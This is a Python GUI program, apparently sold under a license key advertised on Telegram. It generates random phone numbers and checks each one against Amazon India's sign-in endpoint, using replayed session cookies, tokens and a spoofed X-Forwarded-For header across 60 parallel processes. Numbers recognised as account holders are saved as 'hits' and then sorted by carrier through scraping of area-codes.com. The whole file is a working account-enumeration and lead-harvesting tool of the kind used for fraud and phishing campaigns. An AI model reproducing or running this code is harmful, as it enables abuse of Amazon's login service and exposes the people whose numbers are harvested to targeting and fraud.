import os
import sys
import re
import time
import random
import threading
import multiprocessing
from multiprocessing import Pool, freeze_support
import tkinter as tk
from tkinter import ttk, messagebox, simpledialog
import tkinter.font as tkfont
import requests, urllib3
from bs4 import BeautifulSoup
from termcolor import colored
from colorama import init

# --- Initialization & Global Variables ---
requests.packages.urllib3.disable_warnings()
init(autoreset=True)

# Global variables for Amazon validation progress
completed_tasks = 0
total_numbers = 0
progress_lock = threading.Lock()


# --- Utility Functions ---
def clear_file(filename):
    """Delete file if it already exists."""
    if os.path.exists(filename):
        os.remove(filename)


def clear_directory(directory):
    """Delete all files in the directory if it exists."""
    if os.path.exists(directory) and os.path.isdir(directory):
        for f in os.listdir(directory):
            file_path = os.path.join(directory, f)
            if os.path.isfile(file_path):
                os.remove(file_path)


def simulate_api_request(duration=3):
    for i in range(duration * 20):
        time.sleep(0.05)


def add_context_menu(widget):
    """
    Add a context (right-click) menu to an Entry widget with Cut, Copy, and Paste options.
    """
    menu = tk.Menu(widget, tearoff=0)
    menu.add_command(label="Cut", command=lambda: widget.event_generate("<<Cut>>"))
    menu.add_command(label="Copy", command=lambda: widget.event_generate("<<Copy>>"))
    menu.add_command(label="Paste", command=lambda: widget.event_generate("<<Paste>>"))
    
    def show_menu(event):
        menu.tk_popup(event.x_root, event.y_root)
        return "break"
        
    widget.bind("<Button-3>", show_menu)


# --- Amazon Checker (Validation) ---
class Amazon:
    session = None

    def __init__(self, num):
        self.url = "https://www.amazon.in/ap/signin"
        self.num = num.strip()
        if Amazon.session is None:
            Amazon.session = requests.Session()
        self.session = Amazon.session

    def check(self):
        cookies = {
            "session-id": "262-6899214-0753700",
            "session-id-time": "2289745062l",
            "i18n-prefs": "INR",
            "csm-hit": ("tb:6NWTTM14VJ00ZAVVBZ3X+b-36CP76CGQ52N3TB0HZG8|"
                        "1659025064788&t:1659025064788&adb:adblk_no"),
            "ubid-acbin": "257-4810331-3732018",
            "session-token": "\"tyoeHgowknphx0Y/CBaiVwnBiwbhUb1PRTvQZQ+07Tq9rmkRD6bErsUDwgq6gu+tA53K6WEAMwOb3pN4Ti3PSFoo+I/Jt5qIEDEMHIeRo1CrE264ogGDHsjge/CwWUZ9bVZtbo32ej/ZPQdm8bYeu6TQhca+UH7Wm9OOwBGoPl7dfoUk79QLYEz69[...]"
        }
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0",
            "Accept": ("text/html,application/xhtml+xml,application/xml;"
                       "q=0.9,image/avif,image/webp,*/*;q=0.8"),
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "DNT": "1",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.amazon.in",
            "Connection": "close",
            "X-Forwarded-For": "127.0.0.1",
            "Referer": ("https://www.amazon.in/ap/signin?"
                        "openid.pape.max_auth_age=0&"
                        "openid.return_to=https%3A%2F%2Fwww.amazon.in%2F%3Fref_%3Dnav_ya_signin&"
                        "openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&"
                        "openid.assoc_handle=inflex&"
                        "openid.mode=checkid_setup&"
                        "openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&"
                        "openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&"),
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1"
        }
        data = {
            "appActionToken": "Aok8C9I71Cr17vp22ONGvDUXR8Yj3D",
            "appAction": "SIGNIN_PWD_COLLECT",
            "subPageType": "SignInClaimCollect",
            "openid.return_to": "ape:aHR0cHM6Ly93d3cuYW1hem9uLmluLz9yZWZfPW5hdl95YV9zaWduaW4=",
            "prevRID": "ape:MzZDUDc2Q0dRNTJOM1RCMEhaRzg=",
            "workflowState": ("eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0."
                              "tCHWdlv4kSSigZCZiGfSCYgnReddxq7c0cUpf0dxYqYzWU-"
                              "ZHIL0mQ.eP-cXQNtVyBr4q_g.fNRQAD5f18IU0nmqT7IwklJZV-_b60As-"
                              "_dvyVd4MMjDpiMoGFJ0edbmuL8GJKT_BEE7ClwIpUYOtUtejr7v8qCRy4iD6bg_"
                              "eBRSnTmZiXzVsx4EuL241zhoriZ7FpXS2seG82sx85C2udl1sPRQyKnO1zIqulOCechL_"
                              "LzBmIRDv9ngzfij-nYmjWrDpZvAXiKCclR9v0UYh_SqjjOIrStMC53AlWjH-hYdDkXWSeTyHchFi9Ij4ndOgJb9tKNucA4_j7Uy-"
                              "R0wvB9zlwEfQNa3394guXjjz6IR3TVMjw41bySCYbHLf6j5oj-5xh6UZm2CsW7DE5gqbHmlq5Nv8zLvTRTO9HJvM9Wr36R1eDRN."
                              "wZAX4qr9VTROJR9qdWbHfw"),
            "email": self.num,
            "password": "",
            "create": "0",
            "metadata1": ("ECdITeCs:MiqSjFZ5zjo+DMY7MlSt3mZjIbfWtB0UicUpYLJ+Zv/uHCXK9q3pnHXCtJkQjQHpnGkq5TTpWuacoyuQ+bkb4yv9EUQwJ4ZBr20hEb4dJphpGtOW40WA7ye80NaJkVKL+aTQt7nS9QKyWcSWTWJNLDZvxSMWCd1ubM6YUI0hmbd9kG4T5[...]")
        }
        res = self.session.post(self.url,
                                headers=headers,
                                cookies=cookies,
                                data=data,
                                verify=False,
                                timeout=15).text

        if "ap_change_login_claim" in res:
            return True, res
        elif "There was a problem" in res:
            return False, res
        else:
            return False, res


def fun_action(num):
    num = num.strip()
    if num.isnumeric() and "+" not in num:
        num = "+%s" % num
    while True:
        try:
            valid, _ = Amazon(num).check()
            if valid:
                with open("Valid33.txt", "a", encoding="utf-8") as ff:
                    ff.write("%s\n" % num)
                print(colored("[+] Valid   ==> Hit %s" % num, "green"))
            else:
                print(colored("[-] Invalid ==> Bad %s" % num, "red"))
            break
        except Exception:
            continue


def process_numbers():
    """Process phone numbers from Gen.txt using a multiprocessing Pool."""
    global completed_tasks, total_numbers
    try:
        seen = set()
        numbers = []
        with open("Gen.txt", "r", encoding="Latin-1") as f:
            for line in f:
                num = line.strip()
                if num and num not in seen:
                    seen.add(num)
                    numbers.append(num)
        total_numbers = len(numbers)
        print(colored(f"Processing {total_numbers} entries...", 'yellow'))
        pool_size = 60
        with Pool(pool_size) as pool:
            for _ in pool.imap_unordered(fun_action, numbers):
                with progress_lock:
                    completed_tasks += 1
    except Exception as e:
        print(e)


# --- Phone Number Validator (Carrier Lookup) ---
class PhoneNumberValidator:

    def lookup_carrier_info(self, npa, nxx):
        url = f"https://www.area-codes.com/exchange/exchange.asp?npa={npa}&nxx={nxx}"
        headers = {
            'User-Agent':
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
            '(KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
        }
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            all_text = soup.get_text()
            if all_text:
                carrier_match = re.search(r'Carrier/Company:(.*?)ZIP Code', all_text, re.DOTALL)
                if carrier_match:
                    carrier_info = carrier_match.group(1).strip()
                    print(colored(f"Carrier lookup for {npa}-{nxx}: {carrier_info}", "green"))
                    return carrier_info
        return None

    def process_batch(self, phone_numbers):
        valid_results = {}
        for line in phone_numbers:
            match = re.search(r'\+1 \((\d{3})\) (\d{3})-(\d{4})', line)
            if match:
                npa = match.group(1)
                nxx = match.group(2)
                carrier_info = self.lookup_carrier_info(npa, nxx)
                if carrier_info:
                    phone_number = re.sub(r'\D', '', line.strip().split("|")[0].strip())
                    if carrier_info not in valid_results:
                        valid_results[carrier_info] = [phone_number]
                    else:
                        valid_results[carrier_info].append(phone_number)
                    print(colored(f"{line.strip()} | Carrier: {carrier_info}", "green"))
                    with open("all_lookup_numbers.txt", "a") as f:
                        f.write(phone_number + "\n")
        return valid_results

    def run(self, input_filename):
        output_folder = "validated_numbers"
        os.makedirs(output_folder, exist_ok=True)
        # Clear the folder before lookup
        clear_directory(output_folder)
        valid_results = {}
        with open(input_filename, 'r') as file:
            lines = file.readlines()
        num_batches = 30
        batch_size = max(1, len(lines) // num_batches)
        batches = [lines[i:i + batch_size] for i in range(0, len(lines), batch_size)]
        pool = multiprocessing.Pool(processes=num_batches)
        results = pool.map(self.process_batch, batches)
        pool.close()
        pool.join()
        for batch_result in results:
            for carrier, numbers in batch_result.items():
                if carrier not in valid_results:
                    valid_results[carrier] = numbers
                else:
                    valid_results[carrier].extend(numbers)
        for carrier, numbers in valid_results.items():
            output_filename = os.path.join(output_folder, f"{carrier}.txt")
            with open(output_filename, 'w') as output_file:
                for phone_number in numbers:
                    output_file.write(phone_number + '\n')
        print(colored(f"{len(lines)} numbers processed. Valid numbers saved in their respective carrier files.", "cyan"))


# =============================================================================
#                          GUI Application Code
# =============================================================================
class MainApp(tk.Tk):
    def __init__(self, *args, **kwargs):
        tk.Tk.__init__(self, *args, **kwargs)
        self.title("Fraud Department - Phone Number Validation")
        self.geometry("800x600")
        self.resizable(False, False)
        # Global background for the app
        self.configure(bg="#f0f4ff")

        # Configure ttk style with updated colors & design
        style = ttk.Style(self)
        style.theme_use("clam")
        style.configure("TFrame", background="#f0f4ff")
        style.configure("TLabel", background="#f0f4ff", font=("Segoe UI", 11), foreground="#333")
        style.configure("Header.TLabel",
                        font=("Segoe UI", 18, "bold"),
                        background="#003366",
                        foreground="white",
                        padding=(10, 10))
        style.configure("SubHeader.TLabel",
                        font=("Segoe UI", 14, "bold"),
                        background="#e6efff",
                        foreground="#003366",
                        padding=(5, 5))
        style.configure("TButton",
                        font=("Segoe UI", 10, "bold"),
                        background="#0052cc",
                        foreground="white",
                        padding=5)
        style.map("TButton",
                  background=[("active", "#003d99")],
                  foreground=[("active", "white")])
        style.configure("TEntry", font=("Segoe UI", 10), padding=5)
        style.configure("TCombobox",
                        font=("Segoe UI", 10),
                        fieldbackground="white",
                        background="white")
        style.configure("Horizontal.TProgressbar", troughcolor="#cce0ff", bordercolor="#cce0ff", background="#0052cc")

        # Main container frame for pagination
        container = ttk.Frame(self)
        container.pack(side="top", fill="both", expand=True, padx=15, pady=15)
        container.grid_rowconfigure(0, weight=1)
        container.grid_columnconfigure(0, weight=1)

        self.frames = {}
        for F in (GeneratorPage, ValidationPage, CarrierLookupPage):
            page_name = F.__name__
            frame = F(parent=container, controller=self)
            self.frames[page_name] = frame
            frame.grid(row=0, column=0, sticky="nsew")

        self.check_license_key()
        self.show_frame("GeneratorPage")

    def show_frame(self, page_name):
        frame = self.frames[page_name]
        frame.tkraise()
        if hasattr(frame, "on_show"):
            frame.on_show()

    def check_license_key(self):
        correct_key = "Anonymous123$"
        while True:
            key = simpledialog.askstring("License Key", "Please enter the license key:", show='*', parent=self)
            if key is None:
                self.destroy()
                sys.exit(0)
            if key == correct_key:
                break
            else:
                messagebox.showerror("Error",
                                     "Incorrect license key. Purchase a license key at https://t.me/Tizlion",
                                     parent=self)


# ----------------- Page 1: Phone Number Generator -----------------
class GeneratorPage(ttk.Frame):
    def __init__(self, parent, controller):
        ttk.Frame.__init__(self, parent)
        self.controller = controller
        self.animating = False
        self.animation_index = 0
        self.animation_texts = ["Generating.", "Generating..", "Generating..."]

        # Header Section
        header = ttk.Label(self, text="Phone Number Generator", style="Header.TLabel")
        header.pack(fill="x", pady=(0, 10))

        # Animated label for visual effect
        self.animation_label = ttk.Label(self, text="", font=("Segoe UI", 12, "italic"), foreground="#0052cc")
        self.animation_label.pack(pady=(0, 10))

        # Form Section creation inside a dedicated frame with border and padding
        form_container = ttk.Frame(self, relief="groove", padding=10)
        form_container.pack(pady=10, padx=20, fill="x")

        ttk.Label(form_container, text="Select Country Code:").grid(row=0, column=0, sticky="w", pady=5, padx=5)
        self.country_var = tk.StringVar(value="1")
        self.country_combo = ttk.Combobox(form_container, textvariable=self.country_var, state="readonly", values=["1", "44", "61"])
        self.country_combo.grid(row=0, column=1, sticky="ew", pady=5, padx=5)

        ttk.Label(form_container, text="Area Codes (comma or space separated):").grid(row=1, column=0, sticky="w", pady=5, padx=5)
        self.area_entry = ttk.Entry(form_container)
        self.area_entry.grid(row=1, column=1, sticky="ew", pady=5, padx=5)
        add_context_menu(self.area_entry)

        ttk.Label(form_container, text="Prefixes (optional, comma or space separated):").grid(row=2, column=0, sticky="w", pady=5, padx=5)
        self.prefix_entry = ttk.Entry(form_container)
        self.prefix_entry.grid(row=2, column=1, sticky="ew", pady=5, padx=5)
        add_context_menu(self.prefix_entry)

        ttk.Label(form_container, text="How many phone numbers to generate:").grid(row=3, column=0, sticky="w", pady=5, padx=5)
        self.count_entry = ttk.Entry(form_container)
        self.count_entry.grid(row=3, column=1, sticky="ew", pady=5, padx=5)
        add_context_menu(self.count_entry)
        form_container.columnconfigure(1, weight=1)

        # Progress Bar Section
        self.gen_progress = ttk.Progressbar(self, orient="horizontal", mode="determinate", style="Horizontal.TProgressbar")
        self.gen_progress.pack(pady=10, padx=20, fill="x")
        self.progress_label = ttk.Label(self, text="Progress: 0%")
        self.progress_label.pack(pady=(0, 10))

        # Buttons Section
        button_frame = ttk.Frame(self)
        button_frame.pack(pady=10)
        self.generate_button = ttk.Button(button_frame, text="Generate", command=self.start_generation)
        self.generate_button.grid(row=0, column=0, padx=10)
        self.continue_button = ttk.Button(button_frame, text="Continue to Validate", command=self.go_to_validation, state="disabled")
        self.continue_button.grid(row=0, column=1, padx=10)

    def update_gen_progress(self, current, total, message=None):
        percent = (current / total * 100) if total else 0
        self.gen_progress['maximum'] = total
        self.gen_progress['value'] = current
        self.progress_label.config(text=f"Progress: {percent:.0f}%")
        if message:
            self.progress_label.config(text=message)

    def animate(self):
        if self.animating:
            self.animation_label.config(text=self.animation_texts[self.animation_index])
            self.animation_index = (self.animation_index + 1) % len(self.animation_texts)
            self.after(500, self.animate)
        else:
            self.animation_label.config(text="")

    def start_generation(self):
        self.generate_button.config(state="disabled")
        self.animating = True
        self.animate()
        threading.Thread(target=self.generate_numbers_thread, daemon=True).start()

    def generate_numbers_thread(self):
        try:
            country_code = self.country_var.get().strip()
            area_codes_raw = self.area_entry.get().strip()
            prefixes_raw = self.prefix_entry.get().strip()
            count_str = self.count_entry.get().strip()
            if not (area_codes_raw and count_str):
                messagebox.showerror("Input Error", "Please fill in the required fields (area codes and number count).", parent=self)
                self.generate_button.config(state="normal")
                self.animating = False
                return
            try:
                num_count = int(count_str)
                if num_count <= 0:
                    raise ValueError
            except ValueError:
                messagebox.showerror("Input Error", "Please enter a positive integer for the number count.", parent=self)
                self.generate_button.config(state="normal")
                self.animating = False
                return

            area_codes = [code.strip() for code in re.split(r'[,\s]+', area_codes_raw) if code.isdigit()]
            if not area_codes:
                messagebox.showerror("Input Error", "Please enter valid area codes (numeric).", parent=self)
                self.generate_button.config(state="normal")
                self.animating = False
                return

            prefixes = []
            if prefixes_raw:
                prefixes = [p.strip() for p in re.split(r'[,\s]+', prefixes_raw) if p.isdigit()]

            self.update_gen_progress(0, num_count, "Connecting to server...")
            simulate_api_request(duration=1)
            generated_numbers = []
            for i in range(num_count):
                area = random.choice(area_codes)
                if prefixes:
                    prefix = random.choice(prefixes)
                else:
                    prefix = str(random.randint(100, 999))
                if country_code == "61":
                    local_length = random.choice([6, 8])
                    line_number = ''.join(random.choices('0123456789', k=local_length))
                    phone_number = f'+{country_code} ({area}) {prefix}{line_number}'
                else:
                    line_number = ''.join(random.choices('0123456789', k=4))
                    phone_number = f'+{country_code} ({area}) {prefix}-{line_number}'
                generated_numbers.append(phone_number)
                print(colored("Generated: " + phone_number, "green"))
                self.controller.after(0, self.update_gen_progress, i + 1, num_count)
                time.sleep(0.001)
            clear_file("Gen.txt")
            with open("Gen.txt", "w") as f:
                for num in generated_numbers:
                    f.write(num + "\n")
            self.controller.after(0, self.update_gen_progress, num_count, num_count,
                                  f"Done: {num_count} numbers generated and saved.")
            self.controller.after(0, lambda: self.continue_button.config(state="normal"))
        except Exception as e:
            messagebox.showerror("Error", str(e), parent=self)
        finally:
            self.animating = False

    def go_to_validation(self):
        self.controller.show_frame("ValidationPage")


# ----------------- Page 2: Amazon Validation -----------------
class ValidationPage(ttk.Frame):
    def __init__(self, parent, controller):
        ttk.Frame.__init__(self, parent)
        self.controller = controller

        header = ttk.Label(self, text="Amazon Validation", style="Header.TLabel")
        header.pack(fill="x", pady=(0, 10))

        self.val_progress = ttk.Progressbar(self, orient="horizontal", mode="determinate", style="Horizontal.TProgressbar")
        self.val_progress.pack(pady=10, padx=20, fill="x")
        self.val_label = ttk.Label(self, text="Validating leads... 0%")
        self.val_label.pack(pady=(0, 10))
        self.continue_button = ttk.Button(self, text="Continue to Carrier Lookup", command=self.go_to_carrier, state="disabled")
        self.continue_button.pack(pady=10)

    def on_show(self):
        global completed_tasks, total_numbers
        completed_tasks = 0
        total_numbers = 0
        clear_file("Valid33.txt")
        self.validation_thread = threading.Thread(target=process_numbers, daemon=True)
        self.validation_thread.start()
        self.update_validation_progress()

    def update_validation_progress(self):
        global completed_tasks, total_numbers
        valid_count = 0
        if os.path.exists("Valid33.txt"):
            with open("Valid33.txt", "r") as f:
                valid_count = sum(1 for line in f if line.strip())
        percent = (completed_tasks / total_numbers * 100) if total_numbers else 0
        self.val_progress['maximum'] = total_numbers
        self.val_progress['value'] = completed_tasks
        self.val_label.config(text=f"Processed: {total_numbers}, Valid: {valid_count}, {percent:.0f}%")
        if self.validation_thread.is_alive():
            self.after(100, self.update_validation_progress)
        else:
            if os.path.exists("Valid33.txt"):
                with open("Valid33.txt", "r") as f:
                    valid_count = sum(1 for line in f if line.strip())
            self.val_label.config(text=f"Validation complete! Processed: {total_numbers}, Valid: {valid_count}")
            self.continue_button.config(state="normal")

    def go_to_carrier(self):
        self.controller.show_frame("CarrierLookupPage")


# ----------------- Page 3: Carrier Lookup -----------------
class CarrierLookupPage(ttk.Frame):
    def __init__(self, parent, controller):
        ttk.Frame.__init__(self, parent)
        self.controller = controller
        self.animating = False
        self.animation_index = 0
        self.animation_texts = ["Looking up carriers.", "Looking up carriers..", "Looking up carriers..."]

        header = ttk.Label(self, text="Carrier Lookup", style="Header.TLabel")
        header.pack(fill="x", pady=(0, 10))

        # Animated label for carrier lookup animation
        self.animation_label = ttk.Label(self, text="", font=("Segoe UI", 12, "italic"), foreground="#0052cc")
        self.animation_label.pack(pady=(0, 10))

        self.carrier_progress = ttk.Progressbar(self, orient="horizontal", mode="indeterminate", style="Horizontal.TProgressbar")
        self.carrier_progress.pack(pady=10, padx=20, fill="x")
        self.carrier_label = ttk.Label(self, text="Looking up carriers...")
        self.carrier_label.pack(pady=(0, 10))
        self.file_summary_label = ttk.Label(self, text="", justify="left")
        self.file_summary_label.pack(pady=10, padx=20)

    def animate(self):
        if self.animating:
            self.animation_label.config(text=self.animation_texts[self.animation_index])
            self.animation_index = (self.animation_index + 1) % len(self.animation_texts)
            self.after(500, self.animate)
        else:
            self.animation_label.config(text="")

    def safe_after(self, delay, callback):
        try:
            if self.controller.winfo_exists():
                self.controller.after(delay, callback)
        except tk.TclError:
            pass

    def on_show(self):
        # Clear the validated_numbers folder before lookup
        clear_directory("validated_numbers")
        self.start_carrier_lookup()

    def start_carrier_lookup(self):
        self.animating = True
        self.animate()
        self.carrier_progress.start(10)
        self.carrier_thread = threading.Thread(target=self.run_carrier_lookup, daemon=True)
        self.carrier_thread.start()
        self.update_summary()

    def update_summary(self):
        folder = "validated_numbers"
        summary = ""
        valid_total = 0
        if os.path.exists(folder):
            for file in os.listdir(folder):
                if file.endswith(".txt"):
                    path = os.path.join(folder, file)
                    try:
                        count = sum(1 for line in open(path))
                    except Exception:
                        count = 0
                    summary += f"{file}: {count}\n"
                    valid_total += count
        else:
            summary = "No carrier files found."
        self.file_summary_label.config(text=f"Total Valid Numbers: {valid_total}\n{summary}")
        self.after(500, self.update_summary)

    def run_carrier_lookup(self):
        if not os.path.exists("Valid33.txt"):
            self.safe_after(0, lambda: messagebox.showerror("Error",
                                                             "Valid33.txt not found. Please run the validation process first.",
                                                             parent=self))
            self.safe_after(0, lambda: self.controller.show_frame("GeneratorPage"))
            return
        try:
            phone_validator = PhoneNumberValidator()
            phone_validator.run("Valid33.txt")
            try:
                with open("Valid33.txt", "r") as f:
                    lines = f.readlines()
                valid_total = len(lines)
            except Exception:
                valid_total = 0
            msg = f"{valid_total} numbers processed. Valid numbers saved in their respective carrier files."
            self.safe_after(0, lambda: self.carrier_progress.stop())
            self.safe_after(0, lambda: self.carrier_label.config(text="Carrier Lookup Complete!"))
            self.safe_after(0, lambda: messagebox.showinfo("Carrier Lookup", msg, parent=self))
        except Exception as e:
            error_message = str(e)
            self.safe_after(0, lambda: messagebox.showerror("Error", error_message, parent=self))
        finally:
            self.animating = False


# =============================================================================
#                                Main
# =============================================================================
def main():
    freeze_support()  # Necessary for Windows multiprocessing support
    app = MainApp()
    app.mainloop()


if __name__ == "__main__":
    main()
